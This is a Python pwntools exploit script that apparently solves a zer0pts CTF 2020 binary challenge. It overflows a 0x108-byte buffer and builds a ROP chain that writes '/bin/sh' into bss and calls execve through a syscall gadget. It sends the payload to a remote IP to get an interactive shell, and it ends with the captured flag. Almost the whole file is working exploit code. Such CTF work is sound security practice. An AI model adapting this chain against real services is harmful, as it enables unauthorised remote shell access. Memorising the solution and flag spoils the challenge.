from pwn import *
import time


addr_gets = 0x4004ee
addr_syscall = 0x40255e

addr_pop_rdi = 0x000000000040141c
addr_pop_rsi_r15 = 0x000000000040141a
addr_pop_rdx = 0x00000000004023f5
addr_pop_rax = 0x0000000000400121

addr_bss = 0x604240
addr_buf = addr_bss + 0x200


payload = b''
# payload += b'A' * 0x108
payload += b'A' * 0x108

payload += p64(addr_pop_rdi)
payload += p64(addr_buf)
payload += p64(addr_gets)

payload += p64(addr_pop_rdi)
payload += p64(addr_buf)
payload += p64(addr_pop_rsi_r15)
payload += p64(addr_buf + 0x18)
payload += p64(0xdeadbeefcafebabe)
payload += p64(addr_pop_rdx)
payload += p64(addr_buf + 0x18)
payload += p64(addr_pop_rax)
payload += p64(59)

payload += p64(addr_syscall)


buf = b''
buf += b'/bin/sh\x00'
buf += p64(0)  # @ addr_buf + 0x8
buf += p64(0)  # @ addr_buf + 0x10
buf += p64(0)  # @ addr_buf + 0x18


binpath = './chall'
elf = ELF(binpath)
context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'

gdbscript = '''
gef
# before return
b *0x000000000040019c
# return from gets
b *0x000000000400590
# syscall
b *0x40255e
ignore 2 1
r
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('13.231.207.73', 9010)
# io = remote('localhost', 4088)

io.recvuntil(b"What's your team name?\n")
time.sleep(1)
io.sendline(payload)
# io.recvuntil(b'CTF 2020!\n')

time.sleep(1)
io.sendline(buf)

io.interactive()

# zer0pts{welcome_yokoso_osooseyo_huanying_dobropozhalovat}
